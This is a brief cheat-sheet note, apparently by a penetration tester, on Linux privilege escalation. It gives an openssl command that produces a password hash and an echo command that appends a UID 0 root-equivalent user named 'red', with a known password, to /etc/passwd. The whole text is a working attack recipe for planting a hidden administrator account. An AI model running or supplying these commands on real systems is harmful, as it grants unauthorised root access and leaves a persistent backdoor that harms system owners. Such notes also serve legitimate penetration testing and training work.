# Entered by Tom R.  20231224

# Manually create a user entry in /passwd for priv esc.
# Openssl uses the "Crypt" algorithm to create this hash.
# Append the user entry to /etc/passwd
# If single quotes don't work, use double quotes or vice versa.

# Generate Password String
openssl passwd Password123
$1$fEuETrQK$yhBp6Y08qt4HbOPT52uyw1

# Manually add password and user to /etc/passwd

echo 'red:$1$fEuETrQK$yhBp6Y08qt4HbOPT52uyw1:0:0:root:/root:/bin/bash' >> /etc/passwd
